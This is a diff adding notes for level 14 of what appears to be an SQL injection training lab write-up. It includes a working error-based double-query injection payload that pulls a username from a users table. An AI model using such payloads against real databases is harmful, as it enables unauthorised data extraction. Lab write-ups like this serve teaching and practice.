@@ -155,6 +155,12 @@ payload : ``Dumb') and (select 1 from(select count(*),concat((select database())
 less-14
 =======
 
+It is also double query injection with ``"``
+
+payload : ``Dumb" and (select 1 from(select count(*),concat((select username from users limit 1),floor(rand()*2))a from information_schema.tables group by a)b)#``
+
+![image](https://user-images.githubusercontent.com/61080375/116280146-01b54a00-a7a6-11eb-99d0-da331b8b8322.png)
+
 
 
 less-18
